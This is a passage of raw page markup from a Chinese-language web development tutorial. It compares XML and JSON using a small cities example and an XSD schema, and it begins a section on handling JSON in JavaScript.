<div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="8"></div> <div class="se-9fe4a25d 
se-5dfcb43c" data-code-line-number="9"></div> <div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="10"></div> 
<div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="11"></div> </div> <div class="se-ba13022f 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2388"> <span data-slate-object="text" data-key="2389"><span data-slate-leaf="true" 
data-offset-key="2389:0" data-first-offset="true"><span data-slate-string="true">&lt;?xml version=</span></span><span 
data-slate-leaf="true" data-offset-key="2389:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_8225683851" data-annotation-type="annotation"><span data-slate-string="true">"1.0"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2389:2"><span data-slate-string="true"> encoding=</span></span><span 
data-slate-leaf="true" data-offset-key="2389:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_7248296727" data-annotation-type="annotation"><span data-slate-string="true">"UTF-8"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2389:4"><span data-slate-string="true"> ?&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2390"> <span data-slate-object="text" data-key="2391"><span data-slate-leaf="true" 
data-offset-key="2391:0" data-first-offset="true"><span data-slate-string="true">&lt;cities&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2392"> <span data-slate-object="text" data-key="2393"><span data-slate-leaf="true" 
data-offset-key="2393:0" data-first-offset="true"><span data-slate-string="true"> &lt;city&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2394"> <span data-slate-object="text" data-key="2395"><span data-slate-leaf="true" 
data-offset-key="2395:0" data-first-offset="true"><span data-slate-string="true"> &lt;name&gt;Beijing&lt;/name&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2396"> <span data-slate-object="text" data-key="2397"><span data-slate-leaf="true" 
data-offset-key="2397:0" data-first-offset="true"><span data-slate-string="true"> &lt;id&gt;1&lt;/id&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2398"> <span data-slate-object="text" data-key="2399"><span data-slate-leaf="true" 
data-offset-key="2399:0" data-first-offset="true"><span data-slate-string="true"> &lt;/city&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2400"> <span data-slate-object="text" data-key="2401"><span data-slate-leaf="true" 
data-offset-key="2401:0" data-first-offset="true"><span data-slate-string="true"> &lt;city&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2402"> <span data-slate-object="text" data-key="2403"><span data-slate-leaf="true" 
data-offset-key="2403:0" data-first-offset="true"><span data-slate-string="true"> &lt;name&gt;Shanghai&lt;/name&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2404"> <span data-slate-object="text" data-key="2405"><span data-slate-leaf="true" 
data-offset-key="2405:0" data-first-offset="true"><span data-slate-string="true"> &lt;id&gt;2&lt;/id&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2406"> <span data-slate-object="text" data-key="2407"><span data-slate-leaf="true" 
data-offset-key="2407:0" data-first-offset="true"><span data-slate-string="true"> &lt;/city&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2408"> <span data-slate-object="text" data-key="2409"><span data-slate-leaf="true" 
data-offset-key="2409:0" data-first-offset="true"><span data-slate-string="true">&lt;/cities&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-0f566022 " data-slate-type="paragraph" data-slate-object="block" data-key="2410"> 
<span data-slate-object="text" data-key="2411"><span data-slate-leaf="true" data-offset-key="2411:0" 
data-first-offset="true"><span data-slate-string="true">如果使用 JSON 的话，由于对于数组可以使用中括号直接支持，而不需要显式写出上例中的 
city 这个 tag 的名称，请你同样建立 cities.json：</span></span></span> </div> <div class="se-ca37e3ec se-0536a6f4" 
data-slate-type="pre" data-slate-object="block" data-key="2412" data-code-language="javascript"> 
<div class="se-c9323ff7 se-2cd2ca3f"> <span></span> </div> <div class="se-f31ac3bc"> <div class="se-f2022f5f 
se-fc56b9bb" data-code-line-number="1"></div> <div class="se-f2022f5f se-fc56b9bb" data-code-line-number="2"></div> 
<div class="se-f2022f5f se-fc56b9bb" data-code-line-number="3"></div> <div class="se-f2022f5f 
se-fc56b9bb" data-code-line-number="4"></div> <div class="se-f2022f5f se-fc56b9bb" data-code-line-number="5"></div> 
<div class="se-f2022f5f se-fc56b9bb" data-code-line-number="6"></div> </div> <div class="se-8f7af4f1 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2413"> <span data-slate-object="text" data-key="2414"><span data-slate-leaf="true" 
data-offset-key="2414:0" data-first-offset="true"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2415"> <span data-slate-object="text" data-key="2416"><span data-slate-leaf="true" 
data-offset-key="2416:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2416:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_2758987074" data-annotation-type="annotation"><span data-slate-string="true">"cities"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2416:2"><span data-slate-string="true">: [</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2417"> <span data-slate-object="text" data-key="2418"><span data-slate-leaf="true" 
data-offset-key="2418:0" data-first-offset="true"><span data-slate-string="true"> {</span></span><span 
data-slate-leaf="true" data-offset-key="2418:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_9427950515" data-annotation-type="annotation"><span data-slate-string="true">"name"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2418:2"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2418:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_8760816188" data-annotation-type="annotation"><span data-slate-string="true">"Beijing"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2418:4"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="2418:5"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_7157179966" data-annotation-type="annotation"><span data-slate-string="true">"id"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2418:6"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2418:7"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9529519029" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="2418:8"><span data-slate-string="true">},</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2419"> <span data-slate-object="text" data-key="2420"><span data-slate-leaf="true" 
data-offset-key="2420:0" data-first-offset="true"><span data-slate-string="true"> {</span></span><span 
data-slate-leaf="true" data-offset-key="2420:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6546540780" data-annotation-type="annotation"><span data-slate-string="true">"name"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2420:2"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2420:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_2184700358" data-annotation-type="annotation"><span data-slate-string="true">"Shanghai"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2420:4"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="2420:5"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_1622943372" data-annotation-type="annotation"><span data-slate-string="true">"id"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2420:6"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2420:7"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4198867663" data-annotation-type="annotation"><span data-slate-string="true">2</span></span></span><span 
data-slate-leaf="true" data-offset-key="2420:8"><span data-slate-string="true">}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2421"> <span data-slate-object="text" data-key="2422"><span data-slate-leaf="true" 
data-offset-key="2422:0" data-first-offset="true"><span data-slate-string="true"> ]</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2423"> <span data-slate-object="text" data-key="2424"><span data-slate-leaf="true" 
data-offset-key="2424:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-e90ba8fb " data-slate-type="paragraph" data-slate-object="block" data-key="2425"> 
<span data-slate-object="text" data-key="2426"><span data-slate-leaf="true" data-offset-key="2426:0" 
data-first-offset="true"><span data-slate-string="true">从这就可以看出，在这种情况下，JSON 似乎确实要更为简洁一些。上例中 
JSON 能够使用中括号直接表示数组，能够直接支持数值、字符串和布尔型的表示。</span></span></span> </div> <div class="se-13ac52c0 
" data-slate-type="paragraph" data-slate-object="block" data-key="2427"> <span data-slate-object="text" 
data-key="2428"><span data-slate-leaf="true" data-offset-key="2428:0" data-first-offset="true"><span 
data-slate-string="true">等等，这样说的话，JSON 因为能够直接支持数值的表示，这个 id 没有双引号修饰，就是数值类型，可是从 XML 中并不能看出这一点啊。因此，从这个角度说，应该是 
JSON 更严谨啊！那为什么说 XML 更严谨，严谨在哪呢？</span></span></span> </div> <div class="se-6c6e9c6b " data-slate-type="paragraph" 
data-slate-object="block" data-key="2429"> <span data-slate-object="text" data-key="2430"><span 
data-slate-leaf="true" data-offset-key="2430:0" data-first-offset="true"><span data-slate-string="true">有些程序员朋友可能会马上想到，XML 
是可以定义 tag 属性的，预定义一个 type 不就好了？</span></span></span> </div> <div class="se-5fe6f896 se-27cd7b42" 
data-slate-type="pre" data-slate-object="block" data-key="2431" data-code-language="cpp"> <div 
class="se-ec3809bb se-d31eec27"> <span></span> </div> <div class="se-8b1635a2"> <div class="se-bc799576 
se-2d42f6f9" data-code-line-number="1"></div> <div class="se-bc799576 se-2d42f6f9" data-code-line-number="2"></div> 
<div class="se-bc799576 se-2d42f6f9" data-code-line-number="3"></div> <div class="se-bc799576 
se-2d42f6f9" data-code-line-number="4"></div> </div> <div class="se-6a37455c ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2432"> <span data-slate-object="text" 
data-key="2433"><span data-slate-leaf="true" data-offset-key="2433:0" data-first-offset="true"><span 
data-slate-string="true">&lt;city&gt;</span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="2434"> <span data-slate-object="text" 
data-key="2435"><span data-slate-leaf="true" data-offset-key="2435:0" data-first-offset="true"><span 
data-slate-string="true"> &lt;name type=</span></span><span data-slate-leaf="true" data-offset-key="2435:1"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_7380630268" 
data-annotation-type="annotation"><span data-slate-string="true">"String"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2435:2"><span data-slate-string="true">&gt;Beijing&lt;/name&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2436"> <span data-slate-object="text" data-key="2437"><span data-slate-leaf="true" 
data-offset-key="2437:0" data-first-offset="true"><span data-slate-string="true"> &lt;id type=</span></span><span 
data-slate-leaf="true" data-offset-key="2437:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6209857702" data-annotation-type="annotation"><span data-slate-string="true">"number"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2437:2"><span data-slate-string="true">&gt;</span></span><span 
data-slate-leaf="true" data-offset-key="2437:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4938252708" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="2437:4"><span data-slate-string="true">&lt;id&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2438"> <span data-slate-object="text" data-key="2439"><span data-slate-leaf="true" 
data-offset-key="2439:0" data-first-offset="true"><span data-slate-string="true">&lt;/city&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-531f63e8 " data-slate-type="paragraph" data-slate-object="block" data-key="2440"> 
<span data-slate-object="text" data-key="2441"><span data-slate-leaf="true" data-offset-key="2441:0" 
data-first-offset="true"><span data-slate-string="true">看起来也能达到“严谨”的目的，可这很可能就是一个不好的实践了，因为 XML 
对于这些常见的数据类型，内置了直接的支持。我们可以通过定义 XML Schema Definition（XSD）来对 XML 的结构做出明确的要求，也就是说，我们不必自己去造轮子，来定义并实现这个 
type 属性。针对上面的 cities.xml，我们可以定义这样的 XSD：</span></span></span> </div> <div class="se-635065b4 
se-493a5c48" data-slate-type="pre" data-slate-object="block" data-key="2442" data-code-language="cpp"> 
<div class="se-9d7fe9b9 se-08d8d693"> <span></span> </div> <div class="se-65c62715"> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="1"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="2"></div> 
<div class="se-fe53107b se-7c4ef22e" data-code-line-number="3"></div> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="4"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="5"></div> 
<div class="se-fe53107b se-7c4ef22e" data-code-line-number="6"></div> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="7"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="8"></div> 
<div class="se-fe53107b se-7c4ef22e" data-code-line-number="9"></div> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="10"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="11"></div> 
<div class="se-fe53107b se-7c4ef22e" data-code-line-number="12"></div> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="13"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="14"></div> 
<div class="se-fe53107b se-7c4ef22e" data-code-line-number="15"></div> <div class="se-fe53107b 
se-7c4ef22e" data-code-line-number="16"></div> <div class="se-fe53107b se-7c4ef22e" data-code-line-number="17"></div> 
</div> <div class="se-e98a8f8e ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2443"> <span data-slate-object="text" data-key="2444"><span 
data-slate-leaf="true" data-offset-key="2444:0" data-first-offset="true"><span data-slate-string="true">&lt;?xml 
version=</span></span><span data-slate-leaf="true" data-offset-key="2444:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_3824263888" data-annotation-type="annotation"><span 
data-slate-string="true">"1.0"</span></span></span><span data-slate-leaf="true" data-offset-key="2444:2"><span 
data-slate-string="true"> encoding=</span></span><span data-slate-leaf="true" data-offset-key="2444:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_2474668975" 
data-annotation-type="annotation"><span data-slate-string="true">"UTF-8"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2444:4"><span data-slate-string="true"> ?&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2445"> <span data-slate-object="text" data-key="2446"><span data-slate-leaf="true" 
data-offset-key="2446:0" data-first-offset="true"><span data-slate-string="true">&lt;xs:schema 
xmlns:xs=</span></span><span data-slate-leaf="true" data-offset-key="2446:1"><span class=" 
gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_4605738392" data-annotation-type="annotation"><span 
data-slate-string="true">"http://www.w3.org/2001/XMLSchema"</span></span></span><span data-slate-leaf="true" 
data-offset-key="2446:2"><span data-slate-string="true">&gt;</span></span></span> </div> <div 
class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2447"> 
<span data-slate-object="text" data-key="2448"><span data-slate-leaf="true" data-offset-key="2448:0" 
data-first-offset="true"><span data-slate-string="true"> &lt;xs:element name=</span></span><span 
data-slate-leaf="true" data-offset-key="2448:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_7386581326" data-annotation-type="annotation"><span data-slate-string="true">"cities"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2448:2"><span data-slate-string="true">&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2449"> <span data-slate-object="text" data-key="2450"><span data-slate-leaf="true" 
data-offset-key="2450:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:complexType&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2451"> <span data-slate-object="text" data-key="2452"><span data-slate-leaf="true" 
data-offset-key="2452:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:sequence&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2453"> <span data-slate-object="text" data-key="2454"><span data-slate-leaf="true" 
data-offset-key="2454:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:element 
name=</span></span><span data-slate-leaf="true" data-offset-key="2454:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_0682870979" data-annotation-type="annotation"><span 
data-slate-string="true">"city"</span></span></span><span data-slate-leaf="true" data-offset-key="2454:2"><span 
data-slate-string="true"> maxOccurs=</span></span><span data-slate-leaf="true" data-offset-key="2454:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_8721632418" 
data-annotation-type="annotation"><span data-slate-string="true">"unbounded"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2454:4"><span data-slate-string="true"> minOccurs=</span></span><span 
data-slate-leaf="true" data-offset-key="2454:5"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_2610401564" data-annotation-type="annotation"><span data-slate-string="true">"0"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2454:6"><span data-slate-string="true">&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2455"> <span data-slate-object="text" data-key="2456"><span data-slate-leaf="true" 
data-offset-key="2456:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:complexType&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2457"> <span data-slate-object="text" data-key="2458"><span data-slate-leaf="true" 
data-offset-key="2458:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:sequence&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2459"> <span data-slate-object="text" data-key="2460"><span data-slate-leaf="true" 
data-offset-key="2460:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:element 
type=</span></span><span data-slate-leaf="true" data-offset-key="2460:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_1828138474" data-annotation-type="annotation"><span 
data-slate-string="true">"xs:string"</span></span></span><span data-slate-leaf="true" data-offset-key="2460:2"><span 
data-slate-string="true"> name=</span></span><span data-slate-leaf="true" data-offset-key="2460:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_2814107281" 
data-annotation-type="annotation"><span data-slate-string="true">"name"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2460:4"><span data-slate-string="true">/&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2461"> <span data-slate-object="text" data-key="2462"><span data-slate-leaf="true" 
data-offset-key="2462:0" data-first-offset="true"><span data-slate-string="true"> &lt;xs:element 
type=</span></span><span data-slate-leaf="true" data-offset-key="2462:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_2686562872" data-annotation-type="annotation"><span 
data-slate-string="true">"xs:byte"</span></span></span><span data-slate-leaf="true" data-offset-key="2462:2"><span 
data-slate-string="true"> name=</span></span><span data-slate-leaf="true" data-offset-key="2462:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_3679947391" 
data-annotation-type="annotation"><span data-slate-string="true">"id"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2462:4"><span data-slate-string="true">/&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2463"> <span data-slate-object="text" data-key="2464"><span data-slate-leaf="true" 
data-offset-key="2464:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:sequence&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2465"> <span data-slate-object="text" data-key="2466"><span data-slate-leaf="true" 
data-offset-key="2466:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:complexType&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2467"> <span data-slate-object="text" data-key="2468"><span data-slate-leaf="true" 
data-offset-key="2468:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:element&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2469"> <span data-slate-object="text" data-key="2470"><span data-slate-leaf="true" 
data-offset-key="2470:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:sequence&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2471"> <span data-slate-object="text" data-key="2472"><span data-slate-leaf="true" 
data-offset-key="2472:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:complexType&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2473"> <span data-slate-object="text" data-key="2474"><span data-slate-leaf="true" 
data-offset-key="2474:0" data-first-offset="true"><span data-slate-string="true"> &lt;/xs:element&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2475"> <span data-slate-object="text" data-key="2476"><span data-slate-leaf="true" 
data-offset-key="2476:0" data-first-offset="true"><span data-slate-string="true">&lt;/xs:schema&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 251px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-303bfd4e " data-slate-type="paragraph" data-slate-object="block" 
data-key="2477"> <span data-slate-object="text" data-key="2478"><span data-slate-leaf="true" 
data-offset-key="2478:0" data-first-offset="true"><span data-slate-string="true">这样一来，我们就对 
cities 和 city 这两个 tag 做了严格的内容限定，包括包含的子节点有哪些，顺序如何，取值类型是什么等等。在实际的 XML 定义中，我们可以引用这个 XSD，这样 XML 
的处理程序就会加载这个 XSD 并根据 schema 的规则对 XML 进行校验，从而发现 XML 不合要求的问题。</span></span></span> </div> <div 
class="se-134fd1f0 " data-slate-type="paragraph" data-slate-object="block" data-key="2479"> 
<span data-slate-object="text" data-key="2480"><span data-slate-leaf="true" data-offset-key="2480:0" 
data-first-offset="true"><span data-slate-string="true">进一步地，你可以自己动动手，看一下</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2481" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2482"><span data-slate-leaf="true" data-offset-key="2482:0" 
data-first-offset="true"><span data-slate-string="true">这个工具</span></span></span></a><span 
data-slate-object="text" data-key="2483"><span data-slate-leaf="true" data-offset-key="2483:0" 
data-first-offset="true"><span data-slate-string="true">，它可以帮助你通过 XML 快速生成样例 XSD；而</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2484" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2485"><span data-slate-leaf="true" data-offset-key="2485:0" 
data-first-offset="true"><span data-slate-string="true">这个工具</span></span></span></a><span 
data-slate-object="text" data-key="2486"><span data-slate-leaf="true" data-offset-key="2486:0" 
data-first-offset="true"><span data-slate-string="true">则可以帮你快速验证 XML 是不是满足某 XSD 的要求，它们都很有用。</span></span></span> 
</div> <div class="se-743bd3c0 " data-slate-type="paragraph" data-slate-object="block" data-key="2487"> 
<span data-slate-object="text" data-key="2488"><span data-slate-leaf="true" data-offset-key="2488:0" 
data-first-offset="true"><span data-slate-string="true">补充一下，你可能也听说过，或使用过类似的叫做 DTD，也就是 Document 
Type Definition 的方式，能想到这个很好，但是 XSD 相对来说有着更大的优势，并成为了 W3C 的标准。因此我在这里不提 DTD，但是我在扩展阅读中放了关于 XSD 
和 DTD 的比较材料，供感兴趣的朋友拓展。</span></span></span> </div> <div class="se-5a437eb8 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2489"> <span data-slate-object="text" data-key="2490"><span 
data-slate-leaf="true" data-offset-key="2490:0" data-first-offset="true"><span data-slate-string="true">我想，从 
XSD 你应该可以体会到 XML 的严谨性了。那喜爱使用 JSON 的程序员，就不能创造一个类似的东西，来填补这个坑——即定义和保证 JSON 的严谨性吗？</span></span></span> 
</div> <div class="se-a23e74ce " data-slate-type="paragraph" data-slate-object="block" data-key="2491"> 
<span data-slate-object="text" data-key="2492"><span data-slate-leaf="true" data-offset-key="2492:0" 
data-first-offset="true"><span data-slate-string="true">有，它就是 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2493" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="2494"><span data-slate-leaf="true" data-offset-key="2494:0" data-first-offset="true"><span 
data-slate-string="true">JSON Schema</span></span></span></a><span data-slate-object="text" 
data-key="2495"><span data-slate-leaf="true" data-offset-key="2495:0" data-first-offset="true"><span 
data-slate-string="true">，也许你已经在项目中使用了，但是还没有统一成标准，也没有被足够广泛地接纳，因此我就不展开来说了。你可以自己实践一下，把上面提到的 JSON 
填写到这个 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2496" 
class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="2497"><span data-slate-leaf="true" 
data-offset-key="2497:0" data-first-offset="true"><span data-slate-string="true">JSON Schema 
推断工具</span></span></span></a><span data-slate-object="text" data-key="2498"><span data-slate-leaf="true" 
data-offset-key="2498:0" data-first-offset="true"><span data-slate-string="true">上面，去看看生成的 
JSON Schema 样例。</span></span></span> </div> <h3 class="se-cf102ea0" data-slate-type="heading" 
data-slate-object="block" data-key="2499"><span data-slate-object="text" data-key="2500"><span 
data-slate-leaf="true" data-offset-key="2500:0" data-first-offset="true"><span data-slate-string="true">2. 
JavaScript 一家亲</span></span></span></h3> <div class="se-4079008b " data-slate-type="paragraph" 
data-slate-object="block" data-key="2501"> <span data-slate-object="text" data-key="2502"><span 
data-slate-leaf="true" data-offset-key="2502:0" data-first-offset="true"><span data-slate-string="true">对于全栈工程师来说，和 
XML 比较起来，JSON 对于前端开发来说，可以说有着不可比拟的亲和力。本来，JSON 就是 JavaScript 对象表示法，就是从 JavaScript 这个源头发展而来的，当然，JSON 
如今是不依赖于任何编程语言的。这个“一家亲”，首先表现在，JSON 和 JavaScript 对象之间的互相转化，可以说是轻而易举的。</span></span></span> </div> 
<div class="se-7e8756be " data-slate-type="paragraph" data-slate-object="block" data-key="2503"> 
<span data-slate-object="text" data-key="2504"><span data-slate-leaf="true" data-offset-key="2504:0" 
data-first-offset="true"><span data-slate-string="true">我们来动动手实践一下，打开 Chrome 的开发者工具，切换到 Console 
页，打开前面建立的 cities.json，拷贝其中的内容到一对反引号（backtick，就是键盘上 esc 下面的那个按键）中，并赋给变量 text：</span></span></span> 
</div> <div class="se-63cedb12 se-2d8750c4" data-slate-type="pre" data-slate-object="block" 
data-key="2505" data-code-language="javascript"> <div class="se-7d4e2d28 se-5275b739"> <span></span> 
</div> <div class="se-77830f8b"> <div class="se-63c30b00 se-83ca1c44" data-code-line-number="1"></div> 
</div> <div class="se-1560ad1f ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2506"> <span data-slate-object="text" data-key="2507"><span 
